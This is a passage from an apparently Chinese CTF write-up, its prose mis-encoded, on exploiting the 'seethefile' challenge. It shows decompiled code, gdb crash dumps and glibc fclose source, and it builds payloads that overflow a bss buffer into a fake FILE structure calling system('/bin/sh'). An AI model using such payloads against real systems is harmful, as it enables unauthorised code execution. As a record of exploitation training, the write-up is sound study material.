class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;name);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, &amp;name);</span><br><span class="line">     <span class="keyword">if</span> ( fp )</span><br><span class="line">       fclose(fp);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½å¦‚å…¶åï¼Œå°±ä¸å¤è¿°äº†ï¼Œä¸€äº›åŠŸèƒ½åšäº†ä¸€ç‚¹checkã€‚æ¼æ´ä¸»è¦æ˜¯ä¸¤ä¸ª</p><ul><li>nptr æ ˆæº¢å‡º</li></ul><p>â€‹    <code>__isoc99_scanf(&quot;%s&quot;, &amp;nptr);</code> æº¢å‡ºå‘ç”Ÿåœ¨æ ˆä¸Š</p><ul><li>name æº¢å‡º</li></ul><p>â€‹       <code>Â·__isoc99_scanf(&quot;%s&quot;, &amp;name);            // overflow in bss</code></p><p>é€šè¿‡ checksec ï¼Œæˆ‘ä»¬å‘ç°æœ‰canary ï¼Œæ ˆæº¢å‡ºéœ€è¦ bypass canaryæ‰èƒ½åˆ©ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/pwn/seethefile&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>å½“æˆ‘ä»¬å’‹è¾“å…¥nameçš„æ—¶å€™è¾“å…¥ä¸€æ®µé•¿çš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåœ¨ fclose ä¼šå‘ç”ŸæŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0xf7fca870 --&gt; 0x0</span><br><span class="line">ESI: 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">EDI: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EBP: 0xffffd6b8 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e749f7 (&lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd690 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">0004| 0xffffd694 --&gt; 0x0</span><br><span class="line">0008| 0xffffd698 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd69c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd6a0 --&gt; 0xffffd708 --&gt; 0x0</span><br><span class="line">0020| 0xffffd6a4 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:pop    edx)</span><br><span class="line">0024| 0xffffd6a8 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd6ac --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">_IO_new_fclose (fp=0x61616161) at iofclose.c:48</span><br><span class="line">48iofclose.c: No such file or directory.</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç° fp æŒ‡é’ˆè¢«è¦†ç›–æˆäº†_IO_new_fclose â€”&gt; fp =  0x61616161</p><p>å›é¡¾ä¸‹ fcloseçš„çŸ¥è¯†ç‚¹ï¼š</p><p>åŠŸèƒ½ï¼šå…³é—­ä¸€ä¸ªæ–‡ä»¶æµï¼Œä½¿ç”¨ fclose å°±å¯ä»¥æŠŠç¼“å†²åŒºå†…æœ€åå‰©ä½™çš„æ•°æ®è¾“å‡ºåˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶æŒ‡é’ˆå’Œæœ‰å…³çš„ç¼“å†²åŒº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">        _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);</span><br><span class="line">strong_alias (_IO_new_fclose, __new_fclose)</span><br><span class="line">versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);</span><br></pre></td></tr></table></figure><p>fclose é¦–å…ˆä¼šè°ƒç”¨_IO_unlink_it å°†æŒ‡å®šçš„ FILE ä»_chain é“¾è¡¨ä¸­è„±é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>ä¹‹åä¼šè°ƒç”¨_IO_file_close_it å‡½æ•°ï¼Œ_IO_file_close_it ä¼šè°ƒç”¨ç³»ç»Ÿæ¥å£ close å…³é—­æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ vtable ä¸­çš„_IO_FINISHï¼Œå…¶å¯¹åº”çš„æ˜¯_IO_file_finish å‡½æ•°ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ free å‡½æ•°é‡Šæ”¾ä¹‹å‰åˆ†é…çš„ FILE ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><p>æ ¹æ®è°ƒç”¨æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦fake ä¸€ä¸ªio file ï¼Œæ‰€ä»¥é¦–å…ˆï¼Œæˆ‘ä»¬å°† fp-&gt; name bufferï¼Œå› ä¸ºè¿™æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ•°æ®æµã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302033603.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302033603.png"></a></p><p>â€‹                       <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302042933.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302042933.png"></a></p><p>æ ¹æ®è°ƒè¯•æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190303231240.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190303231240.png"></a></p><p>è®°å½•ä¸‹è°ƒè¯•è¿‡ç¨‹ï¼š</p><ul><li><p>è¦†ç›– *fp</p><p>Payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">0004| 0xffffd704 --&gt; 0x0</span><br><span class="line">0008| 0xffffd708 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd70c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd710 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">0020| 0xffffd714 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:pop    edx)</span><br><span class="line">0024| 0xffffd718 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd71c --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">_IO_new_fclose (fp=0x804b260 &lt;name&gt;) at iofclose.c:48</span><br><span class="line">48iofclose.c: No such file or directory.</span><br><span class="line">gdb-peda$ telescope <span class="variable">$esi</span>+0x46</span><br><span class="line">0000| 0x804b2a6 --&gt; 0x0</span><br><span class="line">0004| 0x804b2aa --&gt; 0x0</span><br><span class="line">0008| 0x804b2ae --&gt; 0x0</span><br><span class="line">0012| 0x804b2b2 --&gt; 0x0</span><br><span class="line">0016| 0x804b2b6 --&gt; 0x0</span><br><span class="line">0020| 0x804b2ba --&gt; 0x0</span><br><span class="line">0024| 0x804b2be --&gt; 0x0</span><br><span class="line">0028| 0x804b2c2 --&gt; 0x0</span><br></pre></td></tr></table></figure><p><code>cmp    BYTE PTR [esi+0x46],0x0</code> ,  å–[esi+0x46] ä½ä½ä¸€byteçš„å€¼ï¼Œæ­¤æ—¶å€¼ä¸º0ï¼Œåˆ™ CMP æˆç«‹ï¼Œä¸ä¼šè·³è½¬ã€‚</p></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a24 (&lt;_IO_new_fclose+68&gt;:cmp    edi,DWORD PTR [edx+0x8])</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a14 &lt;_IO_new_fclose+52&gt;:jne    0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a1a &lt;_IO_new_fclose+58&gt;:mov    edx,DWORD PTR [esi+0x48]</span><br><span class="line">   0xf7e74a1d &lt;_IO_new_fclose+61&gt;:mov    edi,DWORD PTR gs:0x8</span><br><span class="line">=&gt; 0xf7e74a24 &lt;_IO_new_fclose+68&gt;:cmp    edi,DWORD PTR [edx+0x8]</span><br><span class="line">   0xf7e74a27 &lt;_IO_new_fclose+71&gt;:je     0xf7e74a4f &lt;_IO_new_fclose+111&gt;</span><br><span class="line">   0xf7e74a29 &lt;_IO_new_fclose+73&gt;:xor    eax,eax</span><br><span class="line">   0xf7e74a2b &lt;_IO_new_fclose+75&gt;:mov    ecx,0x1</span><br><span class="line">   0xf7e74a30 &lt;_IO_new_fclose+80&gt;:cmp    DWORD PTR gs:0xc,0x0</span><br></pre></td></tr></table></figure><p>  ç´§æ¥ç€ï¼Œ<code>cmp    edi,DWORD PTR [edx+0x8]</code>åœ¨æ­¤å¤„ä¼šå‘ç”ŸæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶ edx ä¸º 0 ï¼Œç”±ä¸Šä¸‹æ–‡æˆ‘ä»¬çŸ¥é“ï¼Œ</p><p>  <code>    mov    edx,DWORD PTR [esi+0x48]</code>, edx ç”±ï¼Œ[esi+0x48] èµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†[esi+0x48]è®¾ç½®æˆä¸€ä¸ªå¯è¯»åœ°å€ï¼Œesi æ­¤æ—¶ fp åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹ payloadä¸ºå¦‚ä¸‹</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>  å› ä¸ºåé¢æœ‰ä»¥ä¸‹æ“ä½œï¼š</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0x804b270 --&gt; 0x1</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a53 (&lt;_IO_new_fclose+115&gt;:mov    edx,eax)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a4a &lt;_IO_new_fclose+106&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a4c &lt;_IO_new_fclose+108&gt;:mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">   0xf7e74a4f &lt;_IO_new_fclose+111&gt;:add    DWORD PTR [edx+0x4],0x1</span><br><span class="line">=&gt; 0xf7e74a53 &lt;_IO_new_fclose+115&gt;:mov    edx,eax</span><br><span class="line">   0xf7e74a55 &lt;_IO_new_fclose+117&gt;:and    edx,0x8000</span><br><span class="line">   0xf7e74a5b &lt;_IO_new_fclose+123&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a5e &lt;_IO_new_fclose+126&gt;:je     0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a60 &lt;_IO_new_fclose+128&gt;:sub    esp,0xc</span><br></pre></td></tr></table></figure><p>  æ­¤æ—¶ </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7e74a4c &lt;_IO_new_fclose+108&gt;:mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">0xf7e74a4f &lt;_IO_new_fclose+111&gt;:add    DWORD PTR [edx+0x4],0x1</span><br></pre></td></tr></table></figure><p>  edx ä¸º fp+0x48 åçš„åœ°å€ï¼Œæ­¤æ—¶å¦‚æœä¹Ÿå°† èµ‹å€¼ä¸º buffer åœ°å€ï¼Œä¼šä¿®æ”¹æ‰ fp çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬éšä¾¿å¾€ååç§»0x10</p><ul><li><p>æ§åˆ¶ç¨‹åºæµç¨‹</p><p> æ¥ç€è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">EAX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EBX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x0</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd6e0 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EIP: 0xf7e80910 (&lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46])</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e8090c &lt;_IO_new_file_close_it+252&gt;:pop    edi</span><br><span class="line">   0xf7e8090d &lt;_IO_new_file_close_it+253&gt;:ret</span><br><span class="line">   0xf7e8090e &lt;_IO_new_file_close_it+254&gt;:xchg   ax,ax</span><br><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ­¤æ—¶è·Ÿåˆ° </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure><p>å¦‚æœæ­¤æ—¶æ§åˆ¶ eax 